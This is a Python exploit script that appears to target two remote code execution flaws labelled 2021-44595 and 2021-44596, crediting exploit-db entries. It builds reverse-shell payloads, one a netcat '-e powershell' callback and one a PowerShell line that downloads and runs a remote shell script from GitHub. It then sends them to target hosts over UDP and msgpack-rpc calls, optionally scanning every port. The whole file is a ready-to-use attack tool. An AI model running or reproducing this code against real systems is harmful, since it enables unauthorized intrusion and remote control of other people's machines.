#!/usr/bin/python3

import socket

try:
    import msgpackrpc
    enable44595 = True
except Exception as ex:
    print("Might need to install msgpackrpc, as it is a part of 2021-44595")
    print("Non-critical Error: ", ex)
    enable44595 = False
    

reverse_shell_ips = ["10.1.1.21"]
reverse_shell_ports = [1038]
target_ips = ["10.1.1.10"]
target_ports = [1002, 1032] # optional, if not sure just set to []
payloads = [] #You can also put your payloads here if you don't want the default

if payloads == []:
    # Default payloads are a local netcat (in case of a privesc scenario) or remote call to a revshell script
    ncat_dir = "C:\\Temp\\nc64.exe" # This is on the target system, NOT ON THE REMOTEHOST.
    for reverse_shell_ip in reverse_shell_ips:
        for reverse_shell_port in reverse_shell_ports:
            payload1 = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
            payload2 = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {reverse_shell_ip} {reverse_shell_port}"
            payloads.append(payload1)
            payloads.append(payload2)
            
        
        

# Writes a file to test which method works
test_payloads = False
dir_for_tests = "C:\\Temp\\"  # Please include absolute paths ending with a / or \\
# Warning: Will write to target host into the specified folder.

logo = """
┏┓┏┓┏┓┓  ┏┓┏┓┏━┏┓┏┓┏┓┏┓┏┓┏┓┓  ┏┓┏┓┏━┏┓┏━     
┏┛┃┫┏┛┃━━┃┃┃┃┗┓┗┫┣┓┣╋┏┛┃┫┏┛┃━━┃┃┃┃┗┓┗┫┗┓ ┏┓┓┏
┗━┗┛┗━┻  ┗╋┗╋┗┛┗┛┗┛┗┻┗━┗┛┗━┻  ┗╋┗╋┗┛┗┛┗┛•┣┛┗┫
                                         ┛  ┛
# Source: 
https://github.com/i-vt

# OGs: 
https://www.exploit-db.com/exploits/50912
https://www.exploit-db.com/exploits/50913
"""
print(logo)
if target_ports != []: 
    ports_to_scan = target_ports
else: 
    ports_to_scan = list(range(0,65500))
    if reverse_shell_ip == target_ip or reverse_shell_ip in ["127.0.0.1", "::1"]:
        ports_to_scan.remove(reverse_shell_port)

def send_payload_44596(port, payload):
    byte_message = bytes(payload, "utf-8")
    opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    opened_socket.sendto(byte_message, (target_ip, port))
def send_payload_44595(port, payload):
    client = msgpackrpc.Client(msgpackrpc.Address(target_ip, port))
    result = client.call('system_s','powershell',payload)


sent_packets = []
for port in ports_to_scan:
    for target_ip in target_ips:
        if test_payloads:
            import random; randomint = random.randint(0, 999_999_999)
            payload = f'echo "{reverse_shell_ip}, {reverse_shell_port}:  {target_ip}, {port}" > {dir_for_tests}{randomint}.txt'
        for payload in payloads:
            if enable44595: 
                try:
                    send_payload_44595(port, payload)
                    print("[2021-44595] Payload successfully sent to:", target_ip, port)
                except:
                    print("[2021-44595] Payload failed to send to port:", target_ip, port)
            try:
                send_payload_44596(port, payload)
                print("[2021-44596] Payload successfully sent to port:", target_ip, port)
            except:
                print("[2021-44596] Payload failed to send to port:", target_ip, port)
               
    
        
